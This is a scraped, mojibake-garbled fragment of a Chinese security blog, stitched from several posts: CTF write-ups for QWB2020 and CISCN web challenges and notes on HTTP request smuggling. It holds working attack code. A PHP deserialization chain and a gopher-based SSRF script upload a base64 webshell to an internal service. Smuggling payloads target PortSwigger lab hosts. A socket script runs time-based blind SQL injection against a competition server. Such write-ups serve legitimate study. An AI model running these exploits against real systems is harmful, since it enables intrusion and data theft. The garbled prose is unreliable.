ç¬¬äºŒæ¬¡ååºåˆ—åŒ–æ˜¯è®©ç¨‹åºåœ¨ob_end_clean()æ‰§è¡Œä¹‹å‰æŠ¥é”™é€€å‡º. ob_startä¼šæ‰“å¼€è¾“å‡ºç¼“å†²\nå¯ç”¨è¾“å‡ºç¼“å†²ä¼šå¯¼è‡´PHPå¼€å§‹å­˜å‚¨ä½ è¾“å‡ºçš„è„šæœ¬è€Œä¸æ˜¯ç«‹å³å°†å®ƒä»¬å‘é€åˆ°å®¢æˆ·ç«¯ã€‚å½“è„šæœ¬ç»“æŸæˆ–è€…ä½ è°ƒç”¨äº†ob_flush()å‡½æ•°ï¼ŒPHPæ‰ä¼šå°†å†…å®¹å‘é€åˆ°å®¢æˆ·ç«¯ã€‚\nob_end_cleanä¼šå°†è¾“å‡ºç¼“å†²çš„å†…å®¹è¿›è¡Œä¸€ä¸ªæ¸…ç©º, é‚£ä¹ˆå¦‚æœè¦çœ‹åˆ°$resultçš„å†…å®¹çš„è¯, æˆ‘ä»¬å°±éœ€è¦åœ¨ob_end_cleanä¹‹å‰é€€å‡ºç¨‹åº. é€šè¿‡å°†$aèµ‹å€¼ä¸ºthiså¯ä»¥åšåˆ°è®©ç¨‹åºæŠ¥é”™é€€å‡º.\n\u0026lt;?php class Pass{ function read(){ // ob_start(); global $result; print $result; } } class User{ public $age, $sex, $num; function __construct($a, $b, $c) { $this-\u0026gt;age = $a; $this-\u0026gt;sex = $b; $this-\u0026gt;num = $c; } } echo urlencode(serialize([ new User(new Pass(), \u0026#34;read\u0026#34;, \u0026#34;result\u0026#34;), new User(new Pass(), \u0026#34;read\u0026#34;, \u0026#34;this\u0026#34;) ])); ?\u0026gt; ç„¶åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ssrf.phpçš„å†…å®¹\n\u0026lt;?php //ç»è¿‡æ‰«æç¡®è®¤35000ä»¥ä¸‹ç«¯å£ä»¥åŠ50000ä»¥ä¸Šç«¯å£ä¸å­˜åœ¨ä»»ä½•å†…ç½‘æœåŠ¡,è¯·ç»§ç»­æ¸—é€å†…ç½‘ $url = $_GET[\u0026#39;we_have_done_ssrf_here_could_you_help_to_continue_it\u0026#39;] ?? false; if(preg_match(\u0026#34;/flag|var|apache|conf|proc|log/i\u0026#34; ,$url)){ die(\u0026#34;\u0026#34;); } if($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 1); curl_exec($ch); curl_close($ch); } ?\u0026gt; æ‰«æå‘ç°\nhttp://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/\næœ‰ä¸œè¥¿\nHTTP/1.1 200 OK Date: Thu, 27 Aug 2020 13:04:07 GMT Server: Apache/2.4.18 (Ubuntu) Set-Cookie: PHPSESSID=60uap1c9tcik5f1ivmqqp933g2; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Vary: Accept-Encoding Content-Length: 1121 Content-Type: text/html; charset=UTF-8 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Message Board\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/bootstrap.min.css\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34; style=\u0026#34;text-align:center;vertical-align:middle;\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34; style=\u0026#34;text-align:center;vertical-align:middle;\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Message Board \u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;p class=\u0026#34;lead\u0026#34;\u0026gt; Since there is only one administrator, a person can only submit one opinion at a time. Each time a new opinion is submitted, all old comments will be deleted \u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;br\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34; style=\u0026#34;text-align:center;vertical-align:middle;\u0026#34;\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34; class=\u0026#34;form-inline\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;input class=\u0026#39;form-control\u0026#39; type=\u0026#34;text\u0026#34; name=\u0026#34;file\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#39;panel-body\u0026#39;\u0026gt; \u0026lt;textarea class=\u0026#39;form-control\u0026#39; name=\u0026#39;content\u0026#39; rows=\u0026#39;6\u0026#39;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;br\u0026gt; \u0026lt;br\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#39;btn btn-default col-md-2 form-control\u0026#39; value=\u0026#34;Submit\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; åŒæ—¶\nhttp://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/\nå¯ä»¥è®¿é—®, é‚£ä¹ˆè¿™é‡Œåº”è¯¥æ˜¯ä¸Šä¼ ä¸œè¥¿åˆ°ç›®å½•ä¸‹é¢äº†.è¿™é‡Œä½¿ç”¨gopheråè®®æ¥å‘é€postä¸Šä¼ æ–‡ä»¶, è¿™é‡Œä¾ç„¶ä¼šæœ‰ä¸€ä¸ªè¿‡æ»¤, åŒ…æ‹¬ç­‰å·åœ¨å†…çš„å‡ ç§ç¬¦å·å’Œå­—æ¯ç»„åˆéƒ½è¢«è¿‡æ»¤äº†,ä½¿ç”¨äºŒæ¬¡ç¼–ç åè®®æ¥ç»•è¿‡.\nimport requests from urllib.parse import urlencode, quote_plus, quote url0 = \u0026#34;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=gopher://127.0.0.1:40000/_\u0026#34; upload_data = { \u0026#39;file\u0026#39;:\u0026#39;php://filter/convert.base64-decode|convert.base64-decode/resource=shell.php\u0026#39;, \u0026#39;content\u0026#39;:\u0026#39;UEQ4OVlHTmhkQ0F2Wm14aFoyQTc\u0026#39; # ä¼¼ä¹å¯ä»¥æ­£å¸¸è§£å¯†çš„base64éƒ½æ— æ³•å†™å…¥æ–‡ä»¶ä¸­ } upload_data = urlencode(upload_data, quote_via=quote_plus) print(upload_data) gopher_content = \u0026#39;\u0026#39;\u0026#39;POST / HTTP/1.1 Host: 127.0.0.1:40000 Cookie: PHPSESSID=hhhhhhhhhhhhhhhhhhhhhhhaaa; Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: {length} {data}\u0026#39;\u0026#39;\u0026#39;.format(length = len(upload_data), data=upload_data).replace(\u0026#39;\\n\u0026#39;, \u0026#39;\\r\\n\u0026#39;) # ssrf need double url encode url = url0 + quote(quote(gopher_content)) header = {\u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;close\u0026#34;} while True: requests.get(url, headers=header) validate = \u0026#34;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/hhhhhhhhhhhhhhhhhhhhhhhaaa/shell.php res = requests.get(validate) print(res.content) ","permalink":"https://dragonbox.top/posts/ctf-qwb2020-web-1/","summary":"\u003ch2 id=\"half_infiltration\"\u003ehalf_infiltration\u003c/h2\u003e\n\u003cp\u003eå¼€å±€çš„é¡µé¢å¦‚ä¸‹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ephp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ehighlight_file\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003e__FILE__\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$flag\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003efile_get_contents\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ssrf.php\u0026#39;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eclass\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePass\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eread\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eob_start\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eglobal\u003c/span\u003e $result;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eprint\u003c/span\u003e $result;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eclass\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eUser\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e $age,$sex,$num;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e __destruct()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        $student \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e $this\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eage\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        $boy \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e $this\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003esex\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        $a \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e $this\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003enum\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    $student\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e$boy();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eis_string\u003c/span\u003e($a)) \u003cspan style=\"color:#f92672\"\u003e||!\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eis_string\u003c/span\u003e($boy)) \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eis_object\u003c/span\u003e($student)))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eob_end_clean\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eexit\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eglobal\u003c/span\u003e $$a;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    $result\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e$GLOBALS[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;flag\u0026#39;\u003c/span\u003e];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eob_end_clean\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eisset\u003c/span\u003e($_GET[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;x\u0026#39;\u003c/span\u003e])) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eunserialize\u003c/span\u003e($_GET[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;x\u0026#39;\u003c/span\u003e])\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eget_it\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e} \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ€è·¯æ˜¯è¿›è¡Œä¸¤æ¬¡ååºåˆ—åŒ–, ç¬¬ä¸€æ¬¡å°†$_GLOBALS[\u0026lsquo;flag\u0026rsquo;]èµ‹å€¼ç»™å…¨å±€å˜é‡$result, ç¬¬äºŒæ¬¡ååºåˆ—åŒ–æ˜¯è®©ç¨‹åºåœ¨\u003ccode\u003eob_end_clean()\u003c/code\u003eæ‰§è¡Œä¹‹å‰æŠ¥é”™é€€å‡º. \u003ccode\u003eob_start\u003c/code\u003eä¼šæ‰“å¼€è¾“å‡ºç¼“å†²\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eå¯ç”¨è¾“å‡ºç¼“å†²ä¼šå¯¼è‡´PHPå¼€å§‹å­˜å‚¨ä½ è¾“å‡ºçš„è„šæœ¬è€Œä¸æ˜¯ç«‹å³å°†å®ƒä»¬å‘é€åˆ°å®¢æˆ·ç«¯ã€‚å½“è„šæœ¬ç»“æŸæˆ–è€…ä½ è°ƒç”¨äº†ob_flush()å‡½æ•°ï¼ŒPHPæ‰ä¼šå°†å†…å®¹å‘é€åˆ°å®¢æˆ·ç«¯ã€‚\u003c/p\u003e","title":"qwb2020webå¤ç°"},{"content":"æ­£å¸¸çš„è¯·æ±‚\nè¯·æ±‚èµ°ç§, æ”»å‡»è€…é€šè¿‡åœ¨è‡ªå·±çš„è¯·æ±‚ä¸­å¤¹å¸¦ä¸€ä¸ªè¯·æ±‚, æ¥å½±å“åˆ°ä¸‹ä¸€ä¸ªè¯·æ±‚ä¸­, ä¸€ä¸ªå…¸å‹çš„ä¾‹å­æ˜¯åå°„å‹xss, é€šè¿‡åœ¨ä¸Šä¸€æ¬¡è¯·æ±‚ä¸­èµ°ç§ä¸€ä¸ªè¯·æ±‚å¤´, å°±å¯ä»¥åœ¨æ­£å¸¸ç”¨æˆ·æ¥ä¸‹æ¥è¿›è¡Œçš„ä¸€æ¬¡æ­£å¸¸è¯·æ±‚çš„è¿‡ç¨‹ä¸­çº‚æ”¹å…¶è¯·æ±‚å†…å®¹, æ¯”å¦‚ä¿®æ”¹ä»–çš„è¯·æ±‚è·¯å¾„ä¸ºä¸€ä¸ªåå°„æ€§xssé“¾æ¥, è¿™æ ·å°±å¯ä»¥è¾¾åˆ°è®©ç”¨æˆ·ç‚¹å‡»æ­£å¸¸é“¾æ¥ä½†æ˜¯å´è§¦å‘xssé“¾æ¥çš„ç›®çš„.\nå…¶ä»–çš„åˆ©ç”¨\næ•è·ç”¨æˆ·è¯·æ±‚ ç¼“å­˜æŠ•æ¯’ ç»•è¿‡waf(å¤¹å¸¦å±é™©è¯·æ±‚url, å¹¶åœ¨ä¸‹ä¸€æ¬¡æ­£å¸¸è¯·æ±‚çš„æ—¶å€™è§¦å‘) ç»•è¿‡å‰ç«¯å®‰å…¨æ§åˆ¶ é¦–å…ˆè¦çŸ¥é“httpå‘åŒ…è¿‡ç¨‹ä¸­ä¸¤ä¸ªæ ‡å¤´çš„æ„æ€\nContent-Length\nè¡¨ç¤ºè¯·æ±‚ä½“çš„é•¿åº¦, ç®€ç§°CL Content-Length: 10 8 HELLO 10ä¸ªé•¿åº¦æŒ‡çš„æ˜¯ä»¥ä¸‹å†…å®¹çš„é•¿åº¦\n8\\r\\n HELLO\\r\\n Transfer-Encoding, ç®€ç§°TE\nè¡¨ç¤ºç¼–ç æ—¶ä½¿ç”¨çš„å®‰å…¨ä¼ è¾“çš„å½¢å¼æœ‰æ•ˆè½½è·ä½“ # å¸¸è§çš„å‡ ç§ Transfer-Encoding: chunked Transfer-Encoding: compress Transfer-Encoding: deflate Transfer-Encoding: gzip Transfer-Encoding: identity è¯·æ±‚èµ°ç§ä¸­ä¸€èˆ¬ç”¨çš„éƒ½æ˜¯chunked, å°†æ¶ˆæ¯æ­£æ–‡è§†ä¸ºä½¿ç”¨åˆ†å—ç¼–ç .è¿™é‡Œå£°æ˜8å­—èŠ‚é•¿åº¦, ç»è¿‡ä¸€ä¸ªæ¢è¡Œåå¼€å§‹ç»Ÿè®¡, ç»Ÿè®¡å®Œ8å­—èŠ‚åç»è¿‡ä¸€ä¸ªæ¢è¡Œè¡¨ç¤ºä¸‹ä¸€ä¸ªæ•°æ®å—å¼€å§‹, é•¿åº¦ä¸º0, è¢«è§†ä¸ºè¯·æ±‚ç»ˆæ­¢\nTransfer-Encoding: chunked 8 SMUGGLED 0 ä¸€ä¸ªå…¸å‹çš„è¯·æ±‚å¦‚ä¸‹\nHTTP/1.1 200 OK Content-Type: text/plain Transfer-Encoding: chunked 7\\r\\n Mozilla\\r\\n 9\\r\\n Developer\\r\\n 7\\r\\n Network\\r\\n 0\\r\\n \\r\\n è¯·æ±‚èµ°ç§å‘ç”Ÿåœ¨å­˜åœ¨å‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨çš„æƒ…å†µä¸‹, ä¸€èˆ¬æœ‰è¿™ä¹ˆå‡ ç§\nCL-TE: å‰ç«¯æœåŠ¡å™¨è¯†åˆ«çš„æ˜¯Content_-Length, åç«¯æœåŠ¡å™¨è¯†åˆ«çš„æ˜¯Transfer-Encoding TE-CL: å‰ç«¯æœåŠ¡å™¨è¯†åˆ«çš„æ˜¯Transfer-Encoding, åç«¯æœåŠ¡å™¨è¯†åˆ«çš„æ˜¯Content-Length TE-TE: å‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨éƒ½æ˜¯è¯†åˆ«Transfer-Encodingçš„, ä½†æ˜¯å¯ä»¥é€šè¿‡æŸç§æ–¹å¼å¤„ç†æ ‡å¤´è¯±å¯¼ä¸€å°æœåŠ¡å™¨ä¸å¯¹å…¶è¿›è¡Œå¤„ç† Transfer-Encoding: xchunked Transfer-Encoding : chunked Transfer-Encoding: chunked Transfer-Encoding: x Transfer-Encoding:[tab]chunked [space]Transfer-Encoding: chunked X: X[\\n]Transfer-Encoding: chunked Transfer-Encoding : chunked CL-TE POST / HTTP/1.1 Host: ac811f861fa3584f80e0998500f800dc.web-security-academy.net User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: session=6mA52yc42gmrXsBVf3gCCwaizRMowHXn Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G é•¿åº¦ä¸º6æ˜¯å› ä¸º0\\r\\n\\r\\nG, chunkedçœ‹åˆ°0\\r\\n\\r\\nä¹‹åå°±ç»“æŸæ¥å—äº†, å‰©ä¸‹æ¥ä¸€ä¸ªä½œä¸ºä¸‹ä¸€ä¸ªè¯·æ±‚å¤´çš„å¼€å§‹\nTE-CL POST / HTTP/1.1 Host: ac4e1f3c1fe90e5480a44952006b00a0.web-security-academy.net User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: session=MDCGt1IHa1MdeOnP1wkjRX15gMuiEGT6 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 4 Transfer-Encoding: chunked 12 GPOST / HTTP/1.1 0 chunkedæ£€æµ‹åˆç†, æ³¨æ„0\\r\\n\\r\\næ˜¯è§„å®šçš„ç»“æŸæ ¼å¼, ç„¶ååç«¯åªå–12\\r\\n, å‰©ä¸‹æ¥çš„ä¸œè¥¿å°±å˜æˆä¸‹ä¸€ä¸ªè¯·æ±‚çš„ä¸€éƒ¨åˆ†\nTE-TE POST / HTTP/1.1 Host: ac731fb01fc279f280a00aac002d0026.web-security-academy.net User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: session=nGAfuCE6lQ9mnpysbHjt8yG3eO5XnU5S Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 4 Transfer-Encoding: chunked Transfer-Encoding: nothing 12 GPOST / HTTP/1.1 0 è¿™é‡Œçš„æƒ…å†µæ˜¯å‰ç«¯æœåŠ¡å™¨ä»¥ç¬¬ä¸€ä¸ªTEä¸ºæ ‡å‡†åç«¯æœåŠ¡å™¨ä»¥ç¬¬äºŒä¸ªä¸ºæ ‡å‡†, å‰ç«¯æœåŠ¡å™¨é€šè¿‡ä¹‹å, åç«¯æœåŠ¡å™¨çš„TEå€¼ä¸å­˜åœ¨, å°±è½¬è€Œä½¿ç”¨Content-Lengthä¸ºä¾æ®, è¿™ä¸ªæ—¶å€™çš„æƒ…å†µå°±ç›¸å½“äºTE-CLæƒ…å†µ\nè„šæœ¬ç¤ºä¾‹ burpsuiteæœ‰æ—¶å€™ä¼šå¤±è´¥, ç”¨socket\n# 2019 é«˜æ ¡è¿ç»´èµ› ezwaf # ä½¿ç”¨cl-clæ¨¡å¼ ä¸¤ä¸ªcontent-length import socket ip = \u0026#39;111.186.57.43\u0026#39; port = 10601 def send_raw(raw): try: with socket.create_connection((ip, port), timeout=5) as conn: conn.send(raw) res = conn.recv(10240).decode() # print(res) return False except: return True if __name__ == \u0026#39;__main__\u0026#39;: res = \u0026#39;flag{abypass_modsecurity_\u0026#39; res = \u0026#34;\u0026#34; for i in range(1, 64): for j in range(32, 127): payload = \u0026#39;\u0026#39;\u0026#39;GET /?age=1%20or%201%20and%20ascii(substr((select%20*%20from%20flag_xdd),{},1))={}%20and%20sleep(7) HTTP/1.1 Host: 111.186.57.43:10601 Accept-Encoding: gzip, deflate Connection: close Content-Length: 0 Content-Length: 0 \u0026#39;\u0026#39;\u0026#39;.format(str(i), str(j)) exp = payload.encode().replace(b\u0026#39;\\n\u0026#39;, b\u0026#39;\\r\\n\u0026#39;) # print(exp) if send_raw(exp): res += chr(j) print(res) continue ä½¿ç”¨å·¥å…·:\nburpsuiteæ’ä»¶HTTP Request Smuggler\nhttps://github.com/defparam/smuggler\nå‚è€ƒ\nhttps://mp.weixin.qq.com/s/MFw7Trd-zFWNXsU3wTG_Mg\nhttps://portswigger.net/web-security/request-smuggling/exploiting\n","permalink":"https://dragonbox.top/posts/sec-http-smuggling/","summary":"\u003cp\u003eæ­£å¸¸çš„è¯·æ±‚\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20211114141452612.png\" alt=\"image-20211114141452612\"  /\u003e\n\u003c/p\u003e","title":"httpè¯·æ±‚èµ°ç§ç¬”è®°"},{"content":" webè¶Šä¾†è¶Šæ²¡æœ‰ç‰Œé¢äº†\u0026hellip;å›½èµ›æœç„¶æ˜¯pwnå’Œmiscçš„å¤©ä¸‹\neasyphp è¦è®©å­è¿›ç¨‹å¼‚å¸¸é€€å‡º, å…ˆæ‰“å°å‡ºphpçš„æ‰€æœ‰å†…ç½®å‡½æ•°ç„¶åçˆ†ç ´å‘åŒ…å‘ç°è¿™ä¸ªå‡½æ•°å¯ä»¥è®©ä»–å¼‚å¸¸é€€å‡º\na=stream_socket_server babyunserialize ä¼ å…¥flagå¹¶å¯¹flagè¿›è¡Œååºåˆ—åŒ–, æœç´¢__destructå‡½æ•°åå†³å®šç”¨jip.php\nfunction __destruct() { if ($this-\u0026gt;lazy) { $this-\u0026gt;lazy = FALSE; foreach ($this-\u0026gt;data?:[] as $file =\u0026gt; $data) $this-\u0026gt;write($file,$data); } } function write($file,array $data=NULL) { if (!$this-\u0026gt;dir || $this-\u0026gt;lazy) return count($this-\u0026gt;data[$file]=$data); $fw=\\Base::instance(); switch ($this-\u0026gt;format) { case self::FORMAT_JSON: $out=json_encode($data,JSON_PRETTY_PRINT); break; case self::FORMAT_Serialized: $out=$fw-\u0026gt;serialize($data); break; } return $fw-\u0026gt;write($this-\u0026gt;dir.$file,$out); } expå¦‚ä¸‹\n\u0026lt;?php namespace DB{ class jig{ const FORMAT_JSON=1, FORMAT_Serialized=0; protected $dir; protected $data; protected $lazy; protected $format; public function __construct($dir,$data,$lazy) { $this-\u0026gt;data = $data; $this-\u0026gt;dir = $dir; $this-\u0026gt;lazy = $lazy; $this-\u0026gt;format = 0; } } } 